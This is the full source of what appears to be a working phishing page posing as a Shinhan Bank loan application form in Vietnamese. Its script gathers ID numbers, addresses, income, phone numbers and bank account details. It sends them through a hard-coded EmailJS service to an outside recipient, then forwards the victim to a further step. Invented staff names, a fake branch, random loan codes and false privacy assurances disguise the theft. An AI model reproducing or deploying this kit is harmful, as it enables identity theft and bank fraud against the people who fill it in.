<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng Ký Vay Tín Chấp - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <script src="https://www.google.com/recaptcha/api.js?render=6LcZ4z0UAAAAAJb8xKz8z5z5z5z5z5z5z5z5z5z"></script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            background-color: #f8f9fa;
            margin: 0;
        }
        .header {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
        }
        .header img {
            height: 50px;
        }
        .header h1 {
            font-size: 26px;
            font-weight: 700;
            margin: 10px 0 0 0;
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            position: relative;
        }
        .progress-bar-container {
            margin-bottom: 20px;
        }
        .progress-bar {
            height: 20px;
            background-color: #e9ecef;
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar-fill {
            height: 100%;
            background-color: #28a745;
            transition: width 0.3s ease-in-out;
        }
        .step-title {
            color: #003087;
            font-size: 22px;
            font-weight: 700;
            text-align: center;
        }
        .step-description {
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
        }
        .tooltip-icon {
            cursor: pointer;
            color: #003087;
            font-size: 14px;
            margin-left: 5px;
        }
        .form-label {
            font-weight: 500;
        }
        .form-control, .form-select {
            font-size: 16px;
            border-radius: 15px;
        }
        .terms-box {
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 10px;
            background-color: #f9f9f9;
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }
        .terms-box img {
            height: 28px;
            margin-right: 10px;
        }
        .terms-box p {
            margin: 0;
            font-size: 14px;
        }
        .terms-box a {
            color: #003087;
            text-decoration: underline;
        }
        .form-check-label {
            font-size: 14px;
        }
        .btn-primary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #003087;
            border: none;
        }
        .btn-primary:hover {
            background-color: #00205b;
        }
        .btn-primary:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        .btn-secondary {
            font-size: 16px;
            font-weight: 700;
            padding: 10px 20px;
            background-color: #6c757d;
            border: none;
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .btn-secondary:hover {
            background-color: #5a6268;
        }
        .modal-content img {
            height: 30px;
            margin-right: 10px;
        }
        .modal-title {
            font-size: 18px;
            font-weight: 700;
        }
        .modal-body h5 {
            font-size: 16px;
            font-weight: 700;
            margin-top: 15px;
        }
        .modal-body p {
            font-size: 14px;
            line-height: 1.6;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #003087;
            color: white;
            margin-top: 20px;
            font-size: 16px;
        }
        .footer img.lock-icon {
            vertical-align: middle;
            margin-right: 10px;
        }
        .footer-logo {
            height: 40px;
            margin-top: 10px;
        }
        .continue-btn-container {
            text-align: center;
            margin-top: 20px;
        }
        .invalid-feedback {
            display: none;
        }
        .was-validated .form-control:invalid, .was-validated .form-select:invalid {
            border-color: #dc3545;
        }
        .was-validated .form-control:invalid ~ .invalid-feedback,
        .was-validated .form-select:invalid ~ .invalid-feedback {
            display: block;
        }
        .spam-error {
            color: #dc3545;
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin-top: 10px;
            padding: 8px;
            background-color: #ffe6e6;
            border-radius: 5px;
            display: none;
        }
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan';">
        <h1>Đăng Ký Vay Tín Chấp</h1>
    </div>

    <div class="container">
        <button type="button" class="btn btn-secondary" onclick="window.location.href='index.html'">Quay Lại</button>
        <div class="progress-bar-container">
            <div class="progress-bar">
                <div class="progress-bar-fill" id="progressBar" style="width: 10%"></div>
            </div>
        </div>

        <div id="step1" class="step-transition">
            <h5 class="step-title">Đăng Ký Hồ Sơ Vay Tín Chấp</h5>
            <p class="step-description">Vui lòng cung cấp thông tin cá nhân để chúng tôi tiến hành xét duyệt. Thông tin của bạn sẽ được gửi qua email để xử lý hồ sơ.</p>
            <form id="registerForm" novalidate>
                <div class="mb-3">
                    <label for="fullName" class="form-label">Họ và Tên <span class="tooltip-icon" data-bs-toggle="tooltip" title="Họ tên đầy đủ theo CMND/CCCD">ⓘ</span></label>
                    <input type="text" class="form-control" id="fullName" required>
                    <div class="invalid-feedback">Vui lòng nhập họ và tên.</div>
                </div>
                <div class="mb-3">
                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ chiếu <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số định danh trên giấy tờ tùy thân">ⓘ</span></label>
                    <input type="text" class="form-control" id="idNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số CMND/CCCD/Hộ chiếu (9 hoặc 12 số).</div>
                </div>
                <div class="mb-3">
                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD/Hộ chiếu</label>
                    <input type="text" class="form-control" id="idIssueDate" required placeholder="DD/MM/YYYY">
                    <div class="invalid-feedback">Vui lòng nhập ngày cấp (DD/MM/YYYY).</div>
                </div>
                <div class="mb-3">
                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD/Hộ chiếu</label>
                    <input type="text" class="form-control" id="idIssuePlace" required>
                    <div class="invalid-feedback">Vui lòng nhập nơi cấp.</div>
                </div>
                <div class="mb-3">
                    <label for="address" class="form-label">Địa Chỉ Thường Trú <span class="tooltip-icon" data-bs-toggle="tooltip" title="Địa chỉ ghi trên hộ khẩu">ⓘ</span></label>
                    <input type="text" class="form-control" id="address" required>
                    <div class="invalid-feedback">Vui lòng nhập địa chỉ thường trú.</div>
                </div>
                <div class="mb-3">
                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
                    <select class="form-select" id="occupation" required>
                        <option value="nhanvien">Nhân viên văn phòng</option>
                        <option value="kinhdoanh">Kinh doanh tự do</option>
                        <option value="giaovien">Giáo viên</option>
                        <option value="congnhan">Công nhân</option>
                        <option value="kysu">Kỹ sư</option>
                        <option value="bacsi">Bác sĩ</option>
                        <option value="banhang">Nhân viên bán hàng</option>
                        <option value="laixe">Lái xe</option>
                        <option value="noitro">Nội trợ</option>
                        <option value="sinhvien">Sinh viên</option>
                        <option value="khac">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn nghề nghiệp.</div>
                </div>
                <div class="mb-3">
                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Thu nhập trung bình hàng tháng">ⓘ</span></label>
                    <input type="text" class="form-control" id="income" required>
                    <div class="invalid-feedback">Vui lòng nhập thu nhập hàng tháng (số dương).</div>
                </div>
                <div class="mb-3">
                    <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số điện thoại liên lạc chính">ⓘ</span></label>
                    <input type="tel" class="form-control" id="phoneNumber" required placeholder="Nhập 10 số">
                    <div class="invalid-feedback">Vui lòng nhập số điện thoại (10 số).</div>
                </div>
                <div class="mb-3">
                    <label for="email" class="form-label">Email <span class="tooltip-icon" data-bs-toggle="tooltip" title="Email để nhận thông báo">ⓘ</span></label>
                    <input type="email" class="form-control" id="email" required>
                    <div class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
                </div>
                <div class="mb-3">
                    <label for="loanAmountInput" class="form-label">Số Tiền Vay (VND) <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tiền bạn muốn vay">ⓘ</span></label>
                    <input type="text" class="form-control" id="loanAmountInput" required>
                    <div class="invalid-feedback">Vui lòng nhập số tiền vay (số dương).</div>
                </div>
                <div class="mb-3">
                    <label for="loanTerm" class="form-label">Số Tháng Vay</label>
                    <select class="form-select" id="loanTerm" required>
                        <option value="6">6 tháng</option>
                        <option value="12">12 tháng</option>
                        <option value="18">18 tháng</option>
                        <option value="24">24 tháng</option>
                        <option value="36">36 tháng</option>
                        <option value="48">48 tháng</option>
                        <option value="60">60 tháng</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn số tháng vay.</div>
                </div>
                <div class="mb-3">
                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
                    <select class="form-select" id="loanPurpose" required>
                        <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                        <option value="Mua xe">Mua xe</option>
                        <option value="Học tập">Học tập</option>
                        <option value="Chi tiêu cá nhân">Chi tiêu cá nhân</option>
                        <option value="Khác">Khác</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                </div>
                <div class="mb-3">
                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Số tài khoản để giải ngân">ⓘ</span></label>
                    <input type="text" class="form-control" id="accountNumber" required>
                    <div class="invalid-feedback">Vui lòng nhập số tài khoản ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <label for="bankName" class="form-label">Tên Ngân Hàng <span class="tooltip-icon" data-bs-toggle="tooltip" title="Tên ngân hàng của tài khoản">ⓘ</span></label>
                    <select class="form-select" id="bankName" required>
                        <option value="Shinhan Bank">Shinhan Bank</option>
                        <option value="Vietcombank">Vietcombank</option>
                        <option value="Techcombank">Techcombank</option>
                        <option value="BIDV">BIDV</option>
                        <option value="Agribank">Agribank</option>
                        <option value="MB Bank">MB Bank</option>
                        <option value="VPBank">VPBank</option>
                        <option value="Sacombank">Sacombank</option>
                        <option value="ACB">ACB</option>
                        <option value="VietinBank">VietinBank</option>
                        <option value="TPBank">TPBank</option>
                        <option value="HDBank">HDBank</option>
                        <option value="MSB">MSB</option>
                        <option value="VIB">VIB</option>
                        <option value="SeABank">SeABank</option>
                        <option value="OCB">OCB</option>
                        <option value="SCB">SCB</option>
                        <option value="Nam A Bank">Nam A Bank</option>
                        <option value="SHB">SHB</option>
                        <option value="PVcomBank">PVcomBank</option>
                    </select>
                    <div class="invalid-feedback">Vui lòng chọn tên ngân hàng.</div>
                </div>
                <div class="mb-3">
                    <div class="terms-box">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/28x28?text=Lock';">
                        <p>Thông tin của bạn sẽ được bảo mật tuyệt đối theo chính sách bảo mật của Shinhan Bank. Dữ liệu sẽ được gửi qua email để xử lý hồ sơ. Vui lòng đọc kỹ <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">Điều khoản và Điều kiện</a> trước khi tiếp tục.</p>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" id="termsAgree">
                        <label class="form-check-label" for="termsAgree">
                            Tôi đồng ý với các điều khoản và điều kiện của Shinhan Bank.
                        </label>
                        <div id="termsFeedback" class="invalid-feedback" style="display: none;">Vui lòng đồng ý với các điều khoản và điều kiện.</div>
                    </div>
                </div>
                <div class="spam-error" id="spamError">Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.</div>
                <div class="error-message" id="storageError">Lỗi lưu trữ dữ liệu. Vui lòng thử lại.</div>
                <div class="error-message" id="emailError">Lỗi gửi email. Vui lòng thử lại.</div>
                <div class="continue-btn-container">
                    <button type="submit" class="btn btn-primary" id="proceedToStep2Btn" disabled>Tiếp Tục</button>
                </div>
            </form>
        </div>

        <!-- Modal: Terms and Conditions -->
        <div class="modal fade" id="termsModal" tabindex="-1" aria-labelledby="termsModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" onerror="this.src='https://via.placeholder.com/30x30?text=Lock';">
                        <h5 class="modal-title" id="termsModalLabel">Điều Khoản và Điều Kiện</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                    </div>
                    <div class="modal-body">
                        <h5>Chính Sách Bảo Mật</h5>
                        <p>Shinhan Bank cam kết bảo mật thông tin cá nhân của bạn theo quy định pháp luật Việt Nam. Thông tin của bạn sẽ chỉ được sử dụng để xử lý hồ sơ vay và sẽ không được chia sẻ với bên thứ ba mà không có sự đồng ý của bạn. Dữ liệu sẽ được gửi qua email để xử lý hồ sơ.</p>
                        <h5>Điều Kiện Vay</h5>
                        <p>- Độ tuổi: Từ 20 đến 60 tuổi.<br>
                           - Thu nhập tối thiểu: 5,000,000 VND/tháng.<br>
                           - Không có nợ xấu tại thời điểm đăng ký.</p>
                        <h5>Trách Nhiệm của Khách Hàng</h5>
                        <p>Khách hàng cần cung cấp thông tin chính xác và chịu trách nhiệm về tính xác thực của các tài liệu cung cấp.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/i_lock.png" alt="Lock Icon" class="lock-icon" onerror="this.src='https://via.placeholder.com/24x24?text=Lock';">
            <p>© 2025 Shinhan Bank - Hotline: 1900 1234 - Email: <a href="/cdn-cgi/l/email-protection#9be8eeebebf4e9efdbe8f3f2f5f3faf5b5f8f4f6b5edf5"><span class="__cf_email__" data-cfemail="2e5d5b5e5e415c5a6e5d464740464f40004d4143005840">[email protected]</span></a></p>
            <img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo" class="footer-logo" onerror="this.src='https://via.placeholder.com/100x40?text=Logo+Shinhan';">
        </div>
    </div>

    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
    <script>
        // Initialize EmailJS
        (function(){
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        // Placeholder user data
        let userData = {
            fullName: "",
            idNumber: "",
            idIssueDate: "",
            idIssuePlace: "",
            address: "",
            occupation: "",
            income: "",
            phoneNumber: "",
            email: "",
            loanAmount: "",
            loanTerm: "",
            loanPurpose: "",
            accountNumber: "",
            bankName: "",
            termsAgree: false,
            loanCode: "",
            registrationDate: "",
            monthlyPayment: 0,
            interestRate: 0,
            sellerCode: "",
            storeCode: "",
            staffCode: "",
            staffName: "",
            branchName: "",
            isRegistered: false,
            qrData: {},
            atmCard: {},
            currentStep: 1
        };

        // Load user data from localStorage
        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(storedData);
                    console.log('Loaded userData from localStorage:', userData);
                } else {
                    console.warn('No userData found in localStorage, using default.');
                }
            } catch (error) {
                console.error('Error parsing userData from localStorage:', error);
            }
        }

        // Save user data to localStorage
        function saveToLocalStorage() {
            try {
                localStorage.setItem('userData', JSON.stringify(userData));
                console.log('Saved userData to localStorage:', userData);
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
                $('#storageError').text('Lỗi lưu trữ dữ liệu. Bộ nhớ có thể đầy. Vui lòng xóa dữ liệu trình duyệt và thử lại.').show();
                return false;
            }
            return true;
        }

        // Load registered IDs from localStorage
        function loadRegisteredIds() {
            try {
                const storedIds = localStorage.getItem('registeredIds');
                return storedIds ? JSON.parse(storedIds) : [];
            } catch (error) {
                console.error('Error parsing registeredIds from localStorage:', error);
                return [];
            }
        }

        // Save registered IDs to localStorage
        function saveRegisteredIds(ids) {
            try {
                localStorage.setItem('registeredIds', JSON.stringify(ids));
                console.log('Saved registeredIds to localStorage:', ids);
            } catch (error) {
                console.error('Error saving registeredIds to localStorage:', error);
                $('#storageError').show();
            }
        }

        // Format number input
        function formatNumberInput(value) {
            if (!value) return "";
            return Number(value.replace(/[^0-9]/g, '')).toLocaleString('vi-VN');
        }

        // Generate random loan code
        function generateLoanCode() {
            return "SHB" + Math.floor(100000 + Math.random() * 900000);
        }

        // Generate random code
        function generateRandomCode() {
            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            let result = "";
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }

        // Get current date
        function getCurrentDate() {
            const today = new Date();
            const day = String(today.getDate()).padStart(2, '0');
            const month = String(today.getMonth() + 1).padStart(2, '0');
            const year = today.getFullYear();
            return `${day}/${month}/${year}`;
        }

        // Calculate monthly payment (simplified)
        function calculateMonthlyPayment(loanAmount, term) {
            if (!loanAmount || !term) return 0;
            const monthlyRate = 0.075 / 12; // Assuming 7.5% annual interest rate
            const months = parseInt(term);
            return Math.round((loanAmount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months)));
        }

        // Calculate interest rate (simplified)
        function calculateInterestRate(loanAmount) {
            if (!loanAmount) return 0;
            return loanAmount >= 50000000 ? 7.5 : 8.0;
        }

        // Encrypt sensitive data
        function encryptData(data) {
            return CryptoJS.AES.encrypt(data, 'shinhan-secret-key').toString();
        }

        // Validate input formats
        function validateInputFormats() {
            const idNumber = $('#idNumber').val().trim();
            const idIssueDate = $('#idIssueDate').val().trim();
            const phoneNumber = $('#phoneNumber').val().trim();
            const email = $('#email').val().trim();
            const income = $('#income').val().replace(/[^0-9]/g, '');
            const loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '');

            const idNumberRegex = /^\d{9,12}$/;
            const dateRegex = /^\d{2}\/\d{2}\/\d{4}$/;
            const phoneRegex = /^0[1-9][0-9]{8}$/;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!idNumberRegex.test(idNumber)) {
                $('#idNumber').addClass('is-invalid');
                $('#idNumber').next('.invalid-feedback').text('Số CMND/CCCD/Hộ chiếu phải có 9 hoặc 12 số.');
                return false;
            }
            if (!dateRegex.test(idIssueDate)) {
                $('#idIssueDate').addClass('is-invalid');
                $('#idIssueDate').next('.invalid-feedback').text('Ngày cấp phải có định dạng DD/MM/YYYY.');
                return false;
            }
            if (!phoneRegex.test(phoneNumber)) {
                $('#phoneNumber').addClass('is-invalid');
                $('#phoneNumber').next('.invalid-feedback').text('Số điện thoại phải có 10 số, bắt đầu bằng 0.');
                return false;
            }
            if (!emailRegex.test(email)) {
                $('#email').addClass('is-invalid');
                $('#email').next('.invalid-feedback').text('Vui lòng nhập email hợp lệ.');
                return false;
            }
            if (!income || income <= 0) {
                $('#income').addClass('is-invalid');
                $('#income').next('.invalid-feedback').text('Thu nhập phải là số dương.');
                return false;
            }
            if (!loanAmount || loanAmount <= 0) {
                $('#loanAmountInput').addClass('is-invalid');
                $('#loanAmountInput').next('.invalid-feedback').text('Số tiền vay phải là số dương.');
                return false;
            }
            return true;
        }

        // Validate email parameters
        function validateEmailParams(params) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!params.to_email || !emailRegex.test(params.to_email)) {
                $('#emailError').text('Email nhận không hợp lệ.').show();
                return false;
            }
            if (!params.full_name || !params.id_number || !params.phone_number) {
                $('#emailError').text('Thiếu thông tin bắt buộc để gửi email.').show();
                return false;
            }
            return true;
        }

        // Validate form and checkbox
        function validateForm() {
            const form = document.getElementById('registerForm');
            const termsAgree = document.getElementById('termsAgree');
            const termsFeedback = document.getElementById('termsFeedback');
            const proceedBtn = document.getElementById('proceedToStep2Btn');
            const idNumber = $('#idNumber').val().trim();
            const registeredIds = loadRegisteredIds();

            // Reset invalid states
            $('#registerForm .form-control, #registerForm .form-select').removeClass('is-invalid');
            $('#spamError, #emailError, #storageError').hide();

            // Check form fields
            let allFieldsValid = form.checkValidity() && validateInputFormats();
            if (!allFieldsValid) {
                form.classList.add('was-validated');
            }

            // Check terms checkbox
            if (!termsAgree.checked) {
                termsFeedback.style.display = 'block';
            } else {
                termsFeedback.style.display = 'none';
            }

            // Check if idNumber is already registered
            if (idNumber && registeredIds.includes(idNumber)) {
                $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                proceedBtn.disabled = true;
            } else {
                $('#spamError').hide();
                proceedBtn.disabled = !(allFieldsValid && termsAgree.checked);
            }

            console.log('Form validation:', { allFieldsValid, termsChecked: termsAgree.checked, idNumberRegistered: registeredIds.includes(idNumber) });
        }

        // Anti-spam check (removed time-based check)
        function checkSpam() {
            const now = Date.now();
            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
            const registrationCount = spamData.registerCount || 0;
            const registrationResetTime = spamData.resetTime || now;

            // Reset count after 24 hours
            if (now > registrationResetTime) {
                spamData.registerCount = 0;
                spamData.resetTime = now + 24 * 60 * 60 * 1000; // Reset after 24 hours
            }

            // Check registration limit
            if (registrationCount >= 3) {
                return { allowed: false, message: 'Bạn đã vượt quá số lần đăng ký trong 24 giờ. Vui lòng thử lại sau.' };
            }

            return { allowed: true };
        }

        // Update spam data (removed lastRegistrationTime)
        function updateSpamData() {
            const now = Date.now();
            const spamData = JSON.parse(localStorage.getItem('spamData') || '{}');
            spamData.registerCount = (spamData.registerCount || 0) + 1;
            spamData.resetTime = spamData.resetTime || now + 24 * 60 * 60 * 1000;
            localStorage.setItem('spamData', JSON.stringify(spamData));
        }

        // Send registration data via EmailJS with retry
        function sendRegistrationDataEmail() {
            const params = {
                to_name: userData.fullName || 'Khách hàng',
                full_name: userData.fullName || 'Không có',
                id_number: encryptData(userData.idNumber || 'Không có'),
                id_issue_date: userData.idIssueDate || 'Không có',
                id_issue_place: userData.idIssuePlace || 'Không có',
                address: userData.address || 'Không có',
                occupation: userData.occupation || 'Không có',
                income: userData.income ? Number(userData.income).toLocaleString('vi-VN') + ' VND' : 'Không có',
                phone_number: encryptData(userData.phoneNumber || 'Không có'),
                email: userData.email || 'Không có',
                loan_amount: userData.loanAmount ? Number(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : 'Không có',
                loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : 'Không có',
                loan_purpose: userData.loanPurpose || 'Không có',
                account_number: encryptData(userData.accountNumber || 'Không có'),
                bank_name: userData.bankName || 'Không có',
                loan_code: userData.loanCode || 'Không có',
                registration_date: userData.registrationDate || 'Không có',
                to_email: userData.email || 'support@shinhan.com.vn',
                'g-recaptcha-response': ''
            };

            if (!validateEmailParams(params)) return;

            grecaptcha.ready(function() {
                grecaptcha.execute('6LcZ4z0UAAAAAJb8xKz8z5z5z5z5z5z5z5z5z5z', {action: 'submit'}).then(function(token) {
                    params['g-recaptcha-response'] = token;

                    console.log('Preparing to send EmailJS params for Step1:', params);

                    function trySendEmail(attempt = 1, maxAttempts = 3) {
                        emailjs.send('service_60tgxof', 'template_uhyb8ve', params)
                            .then(() => {
                                console.log('Email sent successfully on attempt', attempt);
                                alert("Thông tin đăng ký đã được gửi qua email!");
                                localStorage.removeItem('pendingEmail');
                            })
                            .catch(error => {
                                console.error('EmailJS error on attempt', attempt, ':', error);
                                if (attempt < maxAttempts) {
                                    console.log('Retrying EmailJS send...');
                                    setTimeout(() => trySendEmail(attempt + 1, maxAttempts), 1000 * Math.pow(2, attempt));
                                } else {
                                    alert("Đã xảy ra lỗi khi gửi email. Dữ liệu đã được lưu tạm thời để thử lại sau.");
                                    localStorage.setItem('pendingEmail', JSON.stringify(params));
                                    $('#emailError').show();
                                }
                            });
                    }

                    trySendEmail();
                });
            });
        }

        // Load saved data and initialize form
        window.onload = function() {
            loadUserData();
            $('#fullName').val(userData.fullName || '');
            $('#idNumber').val(userData.idNumber || '');
            $('#idIssueDate').val(userData.idIssueDate || '');
            $('#idIssuePlace').val(userData.idIssuePlace || '');
            $('#address').val(userData.address || '');
            $('#occupation').val(userData.occupation || '');
            $('#income').val(userData.income ? formatNumberInput(userData.income) : '');
            $('#phoneNumber').val(userData.phoneNumber || '');
            $('#email').val(userData.email || '');
            $('#loanAmountInput').val(userData.loanAmount ? formatNumberInput(userData.loanAmount) : '');
            $('#loanTerm').val(userData.loanTerm || '');
            $('#loanPurpose').val(userData.loanPurpose || '');
            $('#accountNumber').val(userData.accountNumber || '');
            $('#bankName').val(userData.bankName || '');
            $('#termsAgree').prop('checked', userData.termsAgree || false);

            // Initialize tooltips
            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            tooltipTriggerList.map(function (tooltipTriggerEl) {
                return new bootstrap.Tooltip(tooltipTriggerEl);
            });

            // Validate form on load
            validateForm();

            // Retry sending pending email
            const pendingEmail = localStorage.getItem('pendingEmail');
            if (pendingEmail) {
                try {
                    const params = JSON.parse(pendingEmail);
                    if (validateEmailParams(params)) {
                        sendRegistrationDataEmail();
                    }
                } catch (error) {
                    console.error('Error retrying pending email:', error);
                }
            }
        };

        // Format number inputs
        $('#income, #loanAmountInput').on('input', function() {
            let value = $(this).val().replace(/[^0-9]/g, '');
            if (value) {
                $(this).val(formatNumberInput(value));
            } else {
                $(this).val('');
            }
            validateForm();
        });

        // Validate on input change
        $('#registerForm input, #registerForm select').on('input change', validateForm);
        $('#termsAgree').on('change', validateForm);

        // Form submission
        $('#registerForm').on('submit', function(e) {
            e.preventDefault();
            const form = e.target;
            form.classList.add('was-validated');
            $('#storageError, #emailError').hide();

            // Kiểm tra idNumber đã đăng ký
            const idNumber = $('#idNumber').val().trim();
            const registeredIds = loadRegisteredIds();
            if (idNumber && registeredIds.includes(idNumber)) {
                $('#spamError').text('Bạn đã có hồ sơ tại Shinhanbank.').show();
                $('#proceedToStep2Btn').prop('disabled', true);
                return;
            }

            // Kiểm tra chống spam
            const spamCheck = checkSpam();
            if (!spamCheck.allowed) {
                $('#spamError').text(spamCheck.message).show();
                $('#proceedToStep2Btn').prop('disabled', true);
                return;
            } else {
                $('#spamError').hide();
            }

            if (form.checkValidity() && $('#termsAgree').is(':checked') && validateInputFormats()) {
                const income = $('#income').val().replace(/[^0-9]/g, '');
                const loanAmount = $('#loanAmountInput').val().replace(/[^0-9]/g, '');
                userData = {
                    fullName: $('#fullName').val().trim(),
                    idNumber: idNumber,
                    idIssueDate: $('#idIssueDate').val().trim(),
                    idIssuePlace: $('#idIssuePlace').val().trim(),
                    address: $('#address').val().trim(),
                    occupation: $('#occupation').val(),
                    income: income,
                    phoneNumber: $('#phoneNumber').val().trim(),
                    email: $('#email').val().trim(),
                    loanAmount: loanAmount,
                    loanTerm: $('#loanTerm').val(),
                    loanPurpose: $('#loanPurpose').val(),
                    accountNumber: $('#accountNumber').val().trim(),
                    bankName: $('#bankName').val(),
                    termsAgree: $('#termsAgree').is(':checked'),
                    loanCode: generateLoanCode(),
                    registrationDate: getCurrentDate(),
                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
                    interestRate: calculateInterestRate(loanAmount),
                    sellerCode: generateRandomCode(),
                    storeCode: generateRandomCode(),
                    staffCode: generateRandomCode(),
                    staffName: "Nguyễn Thị Mỹ Duyên",
                    branchName: "Chi nhánh Shinhanbank Đà Nẵng",
                    isRegistered: false,
                    qrData: {},
                    atmCard: {},
                    currentStep: 2
                };
                console.log('Submitting userData:', userData);

                // Lưu idNumber vào registeredIds
                if (idNumber) {
                    registeredIds.push(idNumber);
                    saveRegisteredIds(registeredIds);
                }

                if (saveToLocalStorage()) {
                    updateSpamData();
                    sendRegistrationDataEmail();
                    window.location.href = 'step2.html';
                }
            } else {
                console.warn('Form validation failed or terms not agreed.');
                alert('Vui lòng điền đầy đủ thông tin, kiểm tra định dạng và đồng ý với điều khoản.');
            }
        });
    </script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93cf2a4e4ce5bf96',t:'MTc0Njc3MjQwNS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body>
</html>
